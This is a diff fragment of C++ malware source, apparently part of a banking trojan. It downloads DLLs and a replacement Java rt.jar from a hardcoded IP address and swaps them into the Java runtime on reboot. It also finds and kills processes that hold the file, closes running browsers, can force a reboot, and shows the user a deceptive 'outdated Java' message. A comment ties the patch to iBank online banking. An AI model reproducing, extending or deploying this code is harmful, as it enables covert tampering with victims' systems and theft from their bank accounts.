+		if ( ! jliDllData )
+		{
+			OutMessage("java_patcher",  "Failed Download jli.dll" );
+			return -1;
+		};
+		unsigned long crc = getCRC32((char*)jliDllData, jliDllLen);
+		unsigned long crc_c = 0;
+		if(m_lstrcmp(javaVer,  "1.6") == 0)
+			crc_c = GetCorrectCRC32(files_crc32, "6_jli.dll");
+		else if(plstrcmpA(javaVer,  "1.7") == 0)
+			crc_c = GetCorrectCRC32(files_crc32, "7_jli.dll");
+		if(crc != crc_c)
+		{
+			OutMessage("java_patcher",  ("CRC32: jli.dll incorrect checksum"));
+			return -1;
+		}
+
+		CHAR* jliDllFilePath = (CHAR*)MemAlloc(MAX_PATH * sizeof(CHAR));
+		pGetTempPathA(MAX_PATH, jliDllFilePath);
+		m_lstrcat(jliDllFilePath,  ("jli.dll"));
+		OutMessage("java_patcher", jliDllFilePath);
+		HANDLE hFile = pCreateFileA(jliDllFilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if(hFile == INVALID_HANDLE_VALUE)
+		{
+			//err = GetLastError();
+			OutMessage("java_patcher",  ("RT PATCH: Can`t create %temp%\\jli.dll"));
+			return -1;
+		}
+		DWORD BitesWritten = 0;
+		pWriteFile(hFile, jliDllData, jliDllLen, &BitesWritten, NULL);
+		if(BitesWritten != jliDllLen)
+		{
+			OutMessage("java_patcher",  ("RT PATCH: BitesWritten != jliDllLen"));
+			return -1;
+		}
+		pCloseHandle(hFile);
+		//MemFree(jliDllData);
+		MemFree(jliDllFilePath);
+		MemFree(url);
+
+		OutMessage("java_patcher",  ("Downloaded: jli.dll"));
+	}
+	//pSleep(20000);
+	{
+
+		char* url = (char*)MemAlloc(512);
+		plstrcpyA(url, base_url);
+		if(plstrcmpA(javaVer, "1.6") == 0)
+			m_lstrcat(url, "6/msvcr71.dll");
+		else if(plstrcmpA(javaVer, "1.7") == 0)
+			m_lstrcat(url, "7/msvcr100.dll");
+
+		DWORD msvcrDllLen = 0;
+		LPVOID msvcrDllData = DownloadPlugin(url, &msvcrDllLen, false);
+		if ( ! msvcrDllData )
+		{
+			OutMessage("java_patcher",  "Failed Download msvcr71.dll" );
+			return -1;
+		};
+		unsigned long crc = getCRC32((char*)msvcrDllData, msvcrDllLen);
+		unsigned long crc_c = 0;
+		if(plstrcmpA(javaVer,  "1.6") == 0)
+			crc_c = GetCorrectCRC32(files_crc32, "6_msvcr71.dll");
+		else if(plstrcmpA(javaVer,  "1.7") == 0)
+			crc_c = GetCorrectCRC32(files_crc32, "7_msvcr100.dll");
+		if(crc != crc_c)
+		{
+			if(plstrcmpA(javaVer,  "1.6") == 0)
+				OutMessage("java_patcher",  ("CRC32: msvcr71.dll incorrect checksum"));
+			else if(plstrcmpA(javaVer,  "1.7") == 0)
+				OutMessage("java_patcher",  ("CRC32: msvcr100.dll incorrect checksum"));
+			return -1;
+		}
+
+		CHAR* msvcrDllFilePath = (CHAR*)MemAlloc(MAX_PATH * sizeof(CHAR));
+		pGetTempPathA(MAX_PATH, msvcrDllFilePath);
+		if(plstrcmpA(javaVer, "1.6") == 0)
+			m_lstrcat(msvcrDllFilePath, ("msvcr71.dll"));
+		else if(plstrcmpA(javaVer, "1.7") == 0)
+			m_lstrcat(msvcrDllFilePath, ("msvcr100.dll"));
+
+		OutMessage("java_patcher", msvcrDllFilePath);
+		HANDLE hFile =pCreateFileA(msvcrDllFilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if(hFile == INVALID_HANDLE_VALUE)
+		{
+			//err = GetLastError();
+			OutMessage("java_patcher",  ("RT PATCH: Can`t create %temp%\\msvcr.dll"));
+			return -1;
+		}
+		DWORD BitesWritten = 0;
+		pWriteFile(hFile, msvcrDllData, msvcrDllLen, &BitesWritten, NULL);
+		if(BitesWritten != msvcrDllLen)
+		{
+			OutMessage("java_patcher",  ("RT PATCH: BitesWritten != msvcrDllLen"));
+			return -1;
+		}
+		pCloseHandle(hFile);
+		//MemFree(msvcrDllData);
+		MemFree(msvcrDllFilePath);
+		MemFree(url);
+
+		OutMessage("java_patcher",  ("Downloaded: msvcr71.dll"));
+	}
+
+	OutMessage("java_patcher",  ("Downloading Complete"));
+
+	return 0;
+}
+
+ DWORD PatchRtJar(char* user_name, char* base_url, CHAR* libPatch)
+{
+	PCHAR base_url_correct = STR::Alloc(STR::Length(base_url)+2);
+	STR::Copy(base_url, base_url_correct, 0, STR::Length(base_url));
+	if(base_url[STR::Length(base_url)-1] != '/') {
+		STR::Copy("/", base_url_correct + STR::Length(base_url), 0, 1);
+	}
+
+
+	CHAR* tmpRtPath = (CHAR*)MemAlloc(MAX_PATH);
+	DWORD res = (DWORD)pGetTempPathA(MAX_PATH, tmpRtPath);
+	plstrcatA(tmpRtPath,  ("rt\\"));
+	OutMessage("java_patcher", tmpRtPath);
+
+ 
+	DWORD attr = (DWORD)pGetFileAttributesA(&tmpRtPath[0]);
+	if(attr == -1 || (attr & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
+		pCreateDirectoryA(&tmpRtPath[0], NULL);
+	else if(attr != -1 && (attr & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)
+	{
+		OutMessage("java_patcher",  ("Clearing tmp folder"));
+		ClearFolder(&tmpRtPath[0]);
+	}
+
+	CHAR* rtAddFilePath = (CHAR*)MemAlloc(MAX_PATH * sizeof(CHAR));
+	CHAR* iniFilePath = (CHAR*)MemAlloc(MAX_PATH * sizeof(CHAR));
+	CHAR* jarExeFilePath = (CHAR*)MemAlloc(MAX_PATH * sizeof(CHAR));
+
+	OutMessage("java_patcher", "DownloadAndSave");
+	OutMessage("java_patcher", base_url_correct);
+	if(DownloadAndSave(base_url_correct, rtAddFilePath, iniFilePath, jarExeFilePath))
+	{
+		OutMessage("java_patcher", "DownloadAndSave fail");
+		STR::Free(base_url_correct);
+		MemFree(tmpRtPath);
+		MemFree(rtAddFilePath);
+		MemFree(iniFilePath);
+		MemFree(jarExeFilePath);
+		return -1;
+	};
+
+
+	if(Patch(user_name, tmpRtPath, rtAddFilePath, iniFilePath, jarExeFilePath, libPatch) != 0)
+	{
+		OutMessage("java_patcher",  ("Clearing tmp folder"));
+		ClearFolder(&tmpRtPath[0]);
+
+		STR::Free(base_url_correct);
+		MemFree(tmpRtPath);
+		MemFree(rtAddFilePath);
+		MemFree(iniFilePath);
+		MemFree(jarExeFilePath);
+		return -1;
+	}
+	
+	OutMessage("java_patcher",  ("Clearing tmp folder"));
+	ClearFolder(&tmpRtPath[0]);
+
+	STR::Free(base_url_correct);
+	MemFree(tmpRtPath);
+	MemFree(rtAddFilePath);
+	MemFree(iniFilePath);
+	MemFree(jarExeFilePath);
+
+	return 0;
+}
+
+ 
+ UCHAR GetFileHandleType()
+{
+	HANDLE                     hFile;
+	PSYSTEM_HANDLE_INFORMATION Info;
+	ULONG                      r;
+	UCHAR                      Result = 0;
+
+	hFile = (HANDLE)pCreateFileA("NUL", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);
+
+	if (hFile != INVALID_HANDLE_VALUE)
+	{
+		Info = (PSYSTEM_HANDLE_INFORMATION)GetInfoTable(SystemHandleInformation);
+
+		if (Info)
+		{
+			for (r = 0; r < Info->uCount; r++)
+			{
+				if (Info->aSH[r].Handle == (USHORT)hFile && 
+					Info->aSH[r].uIdProcess == (DWORD)pGetCurrentProcessId())
+				{
+					Result = Info->aSH[r].ObjectType;
+					break;
+				}
+			}
+
+		    MemFree(Info);
+		}
+
+		pCloseHandle(hFile);
+	}
+	return Result;
+}
+
+ typedef struct _NM_INFO
+{
+	HANDLE  hFile;
+	FILE_NAME_INFORMATION Info;
+	WCHAR Name[MAX_PATH];
+} NM_INFO, *PNM_INFO;
+
+DWORD WINAPI 
+  GetFileNameThread(PVOID lpParameter)
+{
+	PNM_INFO        NmInfo = (PNM_INFO)lpParameter;
+	IO_STATUS_BLOCK IoStatus;
+
+	if (NT_SUCCESS(pZwQueryInformationFile(NmInfo->hFile, &IoStatus, &NmInfo->Info, 
+                          sizeof(NM_INFO) - sizeof(HANDLE), FileNameInformation)) )
+		return 1;
+
+	return 0;
+}
+void GetFileName(HANDLE hFile, PCHAR TheName)
+{
+	HANDLE   hThread;
+	PNM_INFO Info = (PNM_INFO)MemAlloc(sizeof(NM_INFO));//HeapAlloc(hHeap, 0, sizeof(NM_INFO));
+	
+	Info->hFile = hFile;
+/*	if (!GetFileNameThread(Info))
+		return ;
+*/
+	hThread = (HANDLE)pCreateThread(NULL, 0, GetFileNameThread, Info, 0, NULL);
+	
+	if ((DWORD)pWaitForSingleObject(hThread, 100) == WAIT_TIMEOUT)
+	{
+	   pTerminateThread(hThread, 0);
+	   pCloseHandle(hThread);
+	}
+
+	DWORD res = -1;
+	BOOL err = GetExitCodeThread(hThread, &res);
+
+	TheName [ 0 ] = 0; 
+	pWideCharToMultiByte(CP_ACP, 0, Info->Info.FileName - 4, Info->Info.FileNameLength >> 1, TheName, MAX_PATH, NULL, NULL);
+	MemFree(Info);
+	
+}
+
+
+
+ DWORD FindBlockingProcesses(char* FileName, ULONG** PIDs)
+{
+	PSYSTEM_HANDLE_INFORMATION Info;
+	ULONG                      r;
+	CHAR                       Name[MAX_PATH];
+	HANDLE                     hProcess, hFile;
+	UCHAR                      ObFileType;
+
+	DWORD procCount = 0;
+
+
+	ObFileType = GetFileHandleType();
+
+	Info = (PSYSTEM_HANDLE_INFORMATION)GetInfoTable(SystemHandleInformation);
+
+	if (Info)
+	{
+		for (r = 0; r < Info->uCount; r++)
+		{
+			if (Info->aSH[r].ObjectType == ObFileType)
+			{
+				hProcess = (HANDLE)pOpenProcess(PROCESS_DUP_HANDLE, FALSE, Info->aSH[r].uIdProcess);
+
+				if (hProcess)
+				{
+					if (pDuplicateHandle(hProcess, (HANDLE)Info->aSH[r].Handle,
+						(HANDLE)pGetCurrentProcess(), &hFile, 0, FALSE, DUPLICATE_SAME_ACCESS))
+					{
+					//	__asm int 3;
+						
+					/*	OutMessage("java!!!!!", Name);
+						if (!STR::IsEmpty(Name))
+						{*/
+							
+ 							GetFileName(hFile, Name);
+							OutMessage("java", Name);
+							StrLowerCase(Name);
+							OutMessage("java", Name);
+							
+							if(Name[0] != 0 && m_strstr(&Name[0], FileName) != NULL )
+							{
+								//Beep(800, 200);
+								procCount++;
+								*PIDs = (ULONG*)MemRealloc(*PIDs, (procCount + 1) * sizeof(ULONG));
+								m_memcpy((*PIDs + procCount - 1), &Info->aSH[r].uIdProcess, sizeof(ULONG));
+								m_memset((*PIDs + procCount), 0, sizeof(ULONG));
+
+							}
+					/*	}
+						else
+						{
+							
+							OutMessage(Name, "noname");
+						}
+/**/
+						pCloseHandle(hFile);
+					}
+					pCloseHandle(hProcess);
+				}
+			}
+		}
+		MemFree(Info);
+	}
+	return procCount;
+}
+void KillAllBrovser()
+{
+	DWORD PID = 0;
+		pGetWindowThreadProcessId(pFindWindowA("IEFrame", NULL), &PID);
+		if(PID == 0) return ;
+		if(!KillProcess(PID, 1000))
+		{
+			OutMessage("java_patcher return", "IEFrame no stop ie");
+			//int err = GetLastError();
+			//err = err;
+		}
+		PID = 0;
+		pGetWindowThreadProcessId(pFindWindowA("MozillaWindowClass", NULL), &PID);
+		if(PID == 0) return ;
+		if(!KillProcess(PID, 1000))
+		{
+			OutMessage("java_patcher return", "MozillaWindowClass no stop ie");
+			//int err = GetLastError();
+			//err = err;
+		}
+		PID = 0;
+		pGetWindowThreadProcessId(pFindWindowA("OperaWindowClass", NULL), &PID);
+		if(PID == 0) return ;
+		if(!KillProcess(PID, 1000))
+		{
+			OutMessage("java_patcher return", "OperaWindowClass no stop ie");
+			//int err = GetLastError();
+			//err = err;
+		}
+		PID = 0;
+		pGetWindowThreadProcessId(pFindWindowA("Chrome_WidgetWin_0", NULL), &PID);
+		if(PID == 0) return ;
+		if(!KillProcess(PID, 1000))
+		{
+			OutMessage("java_patcher return", "Chrome_WidgetWin_0 no stop ie");
+			//int err = GetLastError();
+			//err = err;
+		}
+}
+
+///////////////////////////////////////////////////////////////////////////////
+HHOOK hMsgBoxHook;
+HCURSOR hArrow,hIbeam;
+
+INT_PTR CALLBACK EditDlgProc(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
+{
+	WNDPROC lpWndProc=(WNDPROC)pGetWindowLongPtrA(hWnd,GWLP_USERDATA);
+    switch (uMsg)
+    {
+        case WM_SETFOCUS:
+        {
+            return 1;
+        }
+        case WM_MOUSEWHEEL:
+        {
+            return NULL;
+        }
+    }
+    if (pGetCursor() == hIbeam)
+        pSetCursor(hArrow);
+    return (INT_PTR)pCallWindowProcA(lpWndProc,hWnd,uMsg,wParam,lParam);
+}
+
+INT_PTR CALLBACK StaticDlgProc(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)
+{
+    bool bCursor=false;
+	WNDPROC lpWndProc=(WNDPROC)pGetWindowLongPtrA(hWnd,GWLP_USERDATA);
+    switch (uMsg)
+    {
+        case WM_NOTIFY:
+        {
+            switch (((LPNMHDR)lParam)->code)
+            {
+                case EN_LINK:
+                {
+                    ENLINK *lpLink=(ENLINK*)lParam;
+                    if (lpLink->msg == WM_LBUTTONUP)
+                    {
+						pSendMessageA(lpLink->nmhdr.hwndFrom,EM_EXSETSEL,0,(LPARAM)&lpLink->chrg);
+                        TCHAR szBuf[260];
+						pSendMessageA(lpLink->nmhdr.hwndFrom,EM_GETSELTEXT,0,(LPARAM)szBuf);
+						pShellExecuteA(NULL,"open",szBuf,NULL,NULL,SW_SHOWNORMAL);
+                    }
+                    bCursor=true;
+                    break;
+                }
+            }
+            break;
+        }
+    }
+    return (LRESULT)pCallWindowProcA(lpWndProc,hWnd,uMsg,wParam,lParam);
+}
+
+LRESULT CALLBACK MsgProc(int nCode,WPARAM wParam,LPARAM lParam)
+{
+    if (nCode == HC_ACTION)
+    {
+        CWPSTRUCT *lpMsg=(CWPSTRUCT*)lParam;
+        switch (LOWORD(lpMsg->message))
+        {
+            case WM_INITDIALOG:
+            {
+                HWND hStatic=(HWND)pGetDlgItem(lpMsg->hwnd,0xFFFF);
+
+                RECT rcStatic;
+                pGetClientRect(hStatic,&rcStatic);
+                TCHAR szBuf[260];
+				pGetWindowTextA(hStatic,szBuf,260);
+				HGDIOBJ hFont=(HGDIOBJ)pSendMessageA(hStatic,WM_GETFONT,NULL,NULL);
+                HWND hRich=(HWND)pCreateWindowExA(WS_EX_NOPARENTNOTIFY,RICHEDIT_CLASS,NULL,WS_CHILD+ES_READONLY+WS_VISIBLE+ES_MULTILINE,0,0,rcStatic.right-rcStatic.left+2,rcStatic.bottom-rcStatic.top,hStatic,NULL,NULL,NULL);
+                pSendMessageA(hRich,WM_SETFONT,(WPARAM)hFont,0);
+                pSendMessageA(hRich,EM_SETBKGNDCOLOR,0,GetSysColor(COLOR_BTNFACE));
+                pSendMessageA(hRich,EM_SETEVENTMASK,0,ENM_LINK);
+                pSendMessageA(hRich,EM_AUTOURLDETECT,TRUE,0);
+				pSetWindowTextA(hRich,szBuf);
+                POINT pt={rcStatic.left,rcStatic.top};
+                pScreenToClient(lpMsg->hwnd,&pt);
+			
+                pSetWindowLongA(hStatic,GWLP_USERDATA,(LONG)pSetWindowLongA(hStatic,GWLP_WNDPROC,(LONG)StaticDlgProc));
+                pSetWindowLongA(hRich,GWLP_USERDATA,(LONG)pSetWindowLongA(hRich,GWLP_WNDPROC,(LONG)EditDlgProc));/**/
+                break;
+            }
+        }
+    }
+    return (LRESULT)pCallNextHookEx(hMsgBoxHook,nCode,wParam,lParam);
+}
+
+int WINAPI ShowHypeMessageBox(HWND hWnd,LPCTSTR lpText,LPCTSTR lpCaption,UINT uType)
+{
+    int dwResult=0;
+    hMsgBoxHook=(HHOOK)pSetWindowsHookExA(WH_CALLWNDPROC,MsgProc,NULL,pGetCurrentThreadId());
+	dwResult=(int)pMessageBoxA(hWnd,lpText,lpCaption,uType);
+	pUnhookWindowsHookEx(hMsgBoxHook);
+    return dwResult;
+}
+
+///////////////////////////////////////////////////////////////////////////////
+DWORD WINAPI ClearAndDel( LPVOID lpData )
+{
+	if(IsJavaCompatibleVersion() > 0)
+		return 0;
+	DWORD err = 0;
+	CHAR* jrePath = GetJREPath(&err);
+	PCHAR path = STR::New(2,jrePath,"\\_rt.jar");
+	plstrcatA(jrePath, "\\rt.jar");
+	pDeleteFileA(jrePath);
+	if (FileExistsA(path))
+	{
+		pMoveFileA(jrePath,path);
+	}
+	pDeleteFileA(path);
+	STR::Free(path);
+	MemFree(jrePath);
+
+	HCURSOR hIbeam=(HCURSOR)pLoadCursorA(0,IDC_IBEAM);
+	HCURSOR hArrow=(HCURSOR)pLoadCursorA(0,IDC_ARROW);
+	HMODULE Lib=(HMODULE)pLoadLibraryA("riched20");
+	ShowHypeMessageBox(0,"У вас старая версия явы,работа на ней не поддерживается,\nскачайте новую версию на сайте http://www.java.com", "Warning", MB_ICONASTERISK);
+	//pFreeLibrary(Lib);
+	return 1;
+
+}
+BOOL isFileExist(CHAR* filename)
+{
+	DWORD attr = (DWORD)pGetFileAttributesA(filename);
+	if(attr == INVALID_FILE_ATTRIBUTES) return FALSE;
+	return TRUE;
+}
+DWORD WINAPI Run_Path(LPVOID lpData)
+{
+	PCHAR lpAllUsersProfile = STR::Alloc(MAX_PATH);
+	pExpandEnvironmentStringsA("%ALLUSERSPROFILE%", lpAllUsersProfile, MAX_PATH);
+	PCHAR TestPath = STR::New(2,lpAllUsersProfile,"\\Pat.txt");
+	STR::Free(lpAllUsersProfile);
+	while ( 1 )
+	{
+		if(isFileExist(TestPath))
+		{
+			StartThread(JavaPatch,NULL);
+			pSleep(5000);
+			STR::Free(TestPath);
+			return 0;
+		}
+		pSleep(5000);
+	}
+	STR::Free(TestPath);
+	return 0;
+}
+
+DWORD WINAPI JavaPatch( LPVOID lpData )
+{
+	if(IsJavaCompatibleVersion() < 0)
+		return 0;
+
+	WJFile();
+	PCHAR lpAllUsersProfile = STR::Alloc(MAX_PATH);
+	pExpandEnvironmentStringsA("%ALLUSERSPROFILE%", lpAllUsersProfile, MAX_PATH);
+	PCHAR uidPath = STR::New(2,lpAllUsersProfile,"\\uid.txt");
+	STR::Free(lpAllUsersProfile);
+	if(isFileExist(uidPath))
+	{
+		STR::Free(uidPath);
+		return TRUE;
+	}
+	STR::Free(uidPath);
+	//STR::Free(lpAllUsersProfile);
+	BOOL bRet = TRUE;
+	DWORD dwUsernameLen = 513;
+	CHAR *User = (CHAR*)MemAlloc(dwUsernameLen + MAX_PATH);
+	CHAR *Path =  (dwUsernameLen + User);
+	CHAR JavaUrl[] ="http://91.228.133.67/rt_jar/";
+	if (User )
+	{
+		//if (JavaUrl  /*GetSectionAnsiString("JavaUrl")*/)
+			if ( pGetUserNameA( User, &dwUsernameLen ) )
+			{
+				DWORD err;
+				PCHAR SourceFile,DestFile,JavaPath;
+				*Path = 0;
+				//	__asm int 3;
+				if (  PatchRtJar(User,&JavaUrl[0],Path) == 0)
+				{
+					//Это для ява-патча надо который с iBank`ом работает.
+					//Раньше он в патче создавался, сейчас - при запуске бота.
+					UID_To_File();
+
+					SourceFile = User;
+					DestFile = Path;
+					m_lstrcpy(SourceFile,Path);
+					m_lstrcat(SourceFile,"\\rt2.jar");
+					m_lstrcat(DestFile,"\\rt.jar");
+						
+					if (JavaPath = GetJREPath(&err))
+					{
+						//pOutputDebugStringA(JavaPath);
+						//PCHAR tmp = STR::New(2,JavaPath,"\\lib\\rt.jar");
+						//if ( tmp )
+						//{
+							ULONG *PIDS = NULL;
+							DWORD i = 0;//FindBlockingProcesses("\\lib\\rt.jar",&PIDS);	
+
+							pMoveFileExA(SourceFile,DestFile,MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT);
+
+							int counter = 0;
+							while ( i = FindBlockingProcesses("\\lib\\rt.jar",&PIDS) )
+							{
+
+								if(counter == 3)
+								{
+									#ifdef KillOs_RebootH
+									Reboot();
+									#endif
+								}
+								counter++;
+								while ( i-- )
+								{
+									OutMessage("java_patcher",  ("Killing processes"));
+									KillProcess(PIDS[i],1000);
+								};
+							};	
+							
+							KillAllBrovser();
+							
+						//};
+						
+					};
+
+					bRet = TRUE;
+					if (! pCopyFileA(SourceFile,DestFile,FALSE) ) {}
+				} // end PatchRtJar(User,JavaUrl,Path)
+				else
+					bRet = FALSE;
+			};
+		if ( JavaUrl == NULL)
+			bRet = FALSE;
+	};	
+	return bRet;
+};
+
+ bool WJFile()
+{
+ //return true;
+	
+	PCHAR sWJDatPath = STR::Alloc(MAX_PATH * sizeof(CHAR));// (CHAR*)MemAlloc(MAX_PATH * sizeof(CHAR));
+	pExpandEnvironmentStringsA("%AllUsersProfile%", sWJDatPath, MAX_PATH);
+ 
+	m_lstrcat(sWJDatPath, "/wj.dat");
+	DWORD attr = (DWORD)pGetFileAttributesA(sWJDatPath);
+	
+	if(attr == INVALID_FILE_ATTRIBUTES)
+	{
+		//KillAllBrovser();
+		if (File::WriteBufferA(sWJDatPath, NULL,0))
+		{
+			MoveFileExA(sWJDatPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+			STR::Free(sWJDatPath);
+			return true;
+		}
+		else
+		{
+			STR::Free(sWJDatPath);
+			return false;
+		}
+
+	}
+	else
+	{
+		STR::Free(sWJDatPath);
+		return true;
+	}
+}
+
+bool ExecuteUpdatePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
+{
+	OutMessage("java_patcher",  "давай обновим, и насладимся обнавленной версией явы");
+	PCHAR sAppData = STR::Alloc(MAX_PATH * sizeof(CHAR));
+	pExpandEnvironmentStringsA("%AllUsersProfile%", sAppData, MAX_PATH);
+ 
+	m_lstrcat(sAppData, "\\uid.txt");
+	pDeleteFileA(sAppData);
+	STR::Free(sAppData);
+	JavaPatch(NULL);
+	return 0;
+}
